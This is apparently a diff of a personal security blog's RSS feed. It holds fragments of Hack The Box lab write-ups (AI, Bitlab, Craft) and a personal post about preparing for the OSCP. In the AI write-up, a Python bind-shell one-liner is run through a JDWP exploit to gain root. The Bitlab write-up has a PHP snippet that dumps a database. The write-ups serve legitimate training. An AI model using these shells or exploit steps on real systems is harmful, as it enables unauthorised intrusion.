+</code></pre>]]></content></item><item><title>Hack The Box - AI</title><link>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</link><pubDate>Fri, 07 Feb 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/02/hack-the-box-ai/</guid><description>Quick Summary Finally, I&amp;rsquo;m posting the walk-through of this box, currently, I&amp;rsquo;m preparing my OSCP so most of my free time goes dedicated to it :D. At the time I did this box, I was only documenting with screenshots, so some dates could differ between the write up below as I accessed now to get plain text to not overload this with screenshots.
+This was a box where for the foothold, you needed to upload a .</description><content type="html"><![CDATA[
     <img src="/images/htb/ai/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -1483,7 +1427,7 @@ tcp                 TIME-WAIT                0                     0            
 <pre><code class="language-console" data-lang="console">root       3875  5.5  5.8 3141684 118248 ?      Sl   21:02   0:05 /usr/bin/java -Djava.util.logging.config.file=/opt/apache-tomcat-9.0.27/conf/logging.properties -Djava.util.logging.manager=org.apache.juli.ClassLoaderLogManager -Djdk.tls.ephemeralDHKeySize=2048 -Djava.protocol.handler.pkgs=org.apache.catalina.webresources -Dorg.apache.catalina.security.SecurityListener.UMASK=0027 -agentlib:jdwp=transport=dt_socket,address=localhost:8000,server=y,suspend=n -Dignore.endorsed.dirs= -classpath /opt/apache-tomcat-9.0.27/bin/bootstrap.jar:/opt/apache-tomcat-9.0.27/bin/tomcat-juli.jar -Dcatalina.base=/opt/apache-tomcat-9.0.27 -Dcatalina.home=/opt/apache-tomcat-9.0.27 -Djava.io.tmpdir=/opt/apache-tomcat-9.0.27/temp org.apache.catalina.startup.Bootstrap start
 </code></pre><p>A quick search google gives a result the next <a href="https://www.exploit-db.com/exploits/46501">exploit</a></p>
 <p>Then to use that exploit a <code>bind.sh</code> is created under <code>/tmp</code> with the next code:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74"></span><span style="color:#e6db74">&#34;</span><span style="color:#e6db74">import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">/bin/bash</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">,</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">-i</span><span style="color:#e6db74">&#39;</span><span style="color:#e6db74">])</span><span style="color:#e6db74">&#34;</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python">python <span style="color:#f92672">-</span>c <span style="color:#e6db74">&#34;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.bind((&#39;&#39;,2222));s.listen(1);conn,addr=s.accept();os.dup2(conn.fileno(),0);os.dup2(conn.fileno(),1);os.dup2(conn.fileno(),2);p=subprocess.call([&#39;/bin/bash&#39;,&#39;-i&#39;])&#34;</span>
 </code></pre></div><p>So, it will bind a shell in the port 2222, after it the exploit is run using that script:</p>
 <pre><code class="language-console" data-lang="console">alexa@AI:~$ ./jdwp-shellifier.py -t 127.0.0.1 -p 8000 --break-on 'java.lang.String.indexOf' --cmd /tmp/bind.sh 
 [+] Targeting '127.0.0.1:8000'
@@ -1509,17 +1453,7 @@ wc -c /root/root.txt
 33 /root/root.txt
 </code></pre><p>Done, we have root access and the root.txt flag :D.</p>
 <p>This was so far one of the boxes I didn&rsquo;t like at all, thanks to the esoteric-ish foothold it had, I didn&rsquo;t end with a feeling of learning something at all after doing this box, anyway, that&rsquo;s all, later I&rsquo;m planning to start blogging current adventure into preparing OSCP, stay tuned for it.</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Hack The Box - Bitlab</title>
-            <link>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</link>
-            <pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</guid>
-            <description>Quick Summary First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the sudo + git path as I&amp;rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.</description>
-            <content type="html"><![CDATA[
+]]></content></item><item><title>Hack The Box - Bitlab</title><link>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</link><pubDate>Sat, 11 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/01/hack-the-box-bitlab/</guid><description>Quick Summary First than everything, I need to make clear that this box has 2 ways for doing privilege escalation: one is doing reversing and the other taking advantage of a misconfiguration with sudo and git. I will describe the steps for the sudo + git path as I&amp;rsquo;m just starting to do my first steps into more low-level stuff. Despite this, in the future I will actualize this post to reflect also the reversing path.</description><content type="html"><![CDATA[
     <img src="/images/htb/bitlab/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -1595,7 +1529,7 @@ We continue enumerating a bit more, and see that the project called <code>Deploy
     <img src="/images/htb/bitlab/1.7-web_enum.png"  class="center"  style="border-radius: 8px;"  />
 
 
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 
 $input <span style="color:#f92672">=</span> <span style="color:#a6e22e">file_get_contents</span>(<span style="color:#e6db74">&#34;php://input&#34;</span>);
 $payload  <span style="color:#f92672">=</span> <span style="color:#a6e22e">json_decode</span>($input);
@@ -1721,11 +1655,11 @@ wc -c root.txt
 
 
 <p>We open it and se it&rsquo;s a script to connect to the database and get a dump of profiles:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#f92672">?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
 <span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
 </code></pre></div><p>Then, inside the profile project we add a new file with that code, but also we create an array with <code>pg_fetch_all($result)</code> in order to save all the profiles dumped, so the result is this one:</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;</span><span style="color:#f92672">?</span><span style="color:#a6e22e">php</span>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-js" data-lang="js"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
 <span style="color:#a6e22e">$db_connection</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_connect</span>(<span style="color:#e6db74">&#34;host=localhost dbname=profiles user=profiles password=profiles&#34;</span>);
 <span style="color:#a6e22e">$result</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_query</span>(<span style="color:#a6e22e">$db_connection</span>, <span style="color:#e6db74">&#34;SELECT * FROM profiles&#34;</span>);
 <span style="color:#a6e22e">$arr</span> <span style="color:#f92672">=</span> <span style="color:#a6e22e">pg_fetch_all</span>(<span style="color:#a6e22e">$result</span>);
@@ -1754,17 +1688,7 @@ clave@bitlab:~$ wc -c user.txt
 </code></pre><p>We got user shell, and after listing the files in it&rsquo;s home there is an interesting .exe called <code>RemoteConnection.exe</code>, from here it will be needed to download that RemoteConnection.exe and start getting the hands dirty with some debugger to start doing reversing and see what it&rsquo;s hiding, but as I said before this will be an update in the future once I know how to do it :P.</p>
 <p>So far then we know this box has 2 ways to get root, I enjoyed quite a lot this box, and Im looking forward to do it again once I know some reversing.</p>
 <p>Until nex write up!</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>Hack The Box - Craft</title>
-            <link>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</link>
-            <pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</guid>
-            <description>Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!</description>
-            <content type="html"><![CDATA[
+]]></content></item><item><title>Hack The Box - Craft</title><link>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</link><pubDate>Sat, 04 Jan 2020 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2020/01/hack-the-box-craft/</guid><description>Quick Summary So!! Today was just retired Craft from Hack the box, this was a really fun box to do, and also I felt pretty well doing it, because even if I needed some nudges, it was actually the first box I got to the foothold without hints (elsen if I needed some guidance with python, thanks a lot @Frundrod!!), and afterward to get user I was a bit lost and also needed some hints (was not realizing something I have literally in my nose, thankss a lot @Fugl!</description><content type="html"><![CDATA[
     <img src="/images/htb/craft/info-card.png"  class="center"  style="border-radius: 8px;"  />
 
 
@@ -2209,20 +2133,10 @@ root@craft:~#
 </code></pre><p>And we own root!!
 Again I enjoyed quite a lot doing this box a few hours it was going to be retired, and again thanks @Frundrod and <a href="https://www.hackthebox.eu/profile/103596">@Fugl</a> for pointing me in the right direction.</p>
 <p>Thanks a lot for reading, and until the next write-up.</p>
-]]></content>
-        </item>
-        
-        <item>
-            <title>shutdown -r now</title>
-            <link>https://ceso.github.io/posts/2019/12/shutdown-r-now/</link>
-            <pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate>
-            
-            <guid>https://ceso.github.io/posts/2019/12/shutdown-r-now/</guid>
-            <description>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.
-I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people who blogs!&amp;quot;, currently that mindset has been changing.</description>
-            <content type="html"><![CDATA[<p>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.</p>
+]]></content></item><item><title>shutdown -r now</title><link>https://ceso.github.io/posts/2019/12/shutdown-r-now/</link><pubDate>Sun, 22 Dec 2019 00:00:00 +0000</pubDate><guid>https://ceso.github.io/posts/2019/12/shutdown-r-now/</guid><description>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.
+I have always been thinking about writing a blog, but my mindset has always been the same &amp;ldquo;me? a blog? what am I supposed to post! I can&amp;rsquo;t even think anything I could share with people, I don&amp;rsquo;t know nothing compared to the people who blogs!&amp;rdquo;, currently that mindset has been changing.</description><content type="html"><![CDATA[<p>Note: First than everything, sorry the english, is not my native language and always learning new stuff about it.</p>
 <p>I have always been thinking about writing a blog, but my mindset has always been the same &ldquo;me? a blog? what am I supposed to post! I can&rsquo;t even think anything I could share with people, I don&rsquo;t know nothing compared to the people
-who blogs!&quot;, currently that mindset has been changing. In the same way, maybe I read a really entry-level article and at some moment and it was (or is) helpful for me, it also could be helpful for another person as well things faced, the issues I ran into, etc&hellip;, and being some sort of way of escape for me itself, I think this change of mindset is the result of my last 9 months living abroad.</p>
+who blogs!&rdquo;, currently that mindset has been changing. In the same way, maybe I read a really entry-level article and at some moment and it was (or is) helpful for me, it also could be helpful for another person as well things faced, the issues I ran into, etc&hellip;, and being some sort of way of escape for me itself, I think this change of mindset is the result of my last 9 months living abroad.</p>
 <p>I consider I started into IT being really old; with 18 I got my first Linux Sysadmin Job while with 9-12 years some children were playing with code, trying to break stuff, etc.
 So far in this aprox. 5 years, I meet really nice people (as also not), and make really really nice friends, and of course been learning quite a lot of stuff, but&hellip;there is something that since I started I been avoiding (Programming), and something I&rsquo;ve been looking forward to learning it but thinking I can&rsquo;t do it (Security), these two things have been chasing me for a longg longg time (at the point of making me feel a bit depressed).</p>
 <p>As I mentioned above, it&rsquo;s been around 9 months since I moved abroad (arrived in the Netherlands at ends of Apr. 2019), of this 9 months I spend 6 months in bench, without a project to work it (yes, getting my salary, but being anxious as I&rsquo;m, makes you to feel some panic when you get a paid for not doing nothing, even if you are studying), in this months I had a lot of time to think about myself, my career, what I wanted to do in the future, do I like to be a DevOps &ldquo;for all my life&rdquo; (today is devops, tomorrow who knows being as how IT works, so is just for saying it in a way), so&hellip;I started to study/practice with the book &lsquo;How to Design Programs&rsquo; (HtDP), even feeling I&rsquo;m going slow looking backwards and comparing to now, I think even if I still haven&rsquo;t finished, it indeed has been allowing me to grow.
@@ -2231,8 +2145,4 @@ Now&hellip;great, but, what about security? Is still there, and I really would l
 Once getting the OSCP, I will come back to the HtDP to polish my programming skills (or why not, also try to keep it in parallel?), and keep climbing (I love rock climbing/bouldering, so I could use a lot of metaphors from it!) my way up to the tops, trying to not compare me with other people, enjoying the route, and learning from all my falls; a fight between me and me.</p>
 <p>I will use this space to post walk-throughs in some HTB boxes, blog some thoughts once in a while (like this post itself), stuff in my path of also learning Dutch, etc.</p>
 <p>So far so good, keep learning and never stop doing it.</p>
-]]></content>
-        </item>
-        
-    </channel>
-</rss>
+]]></content></item></channel></rss>
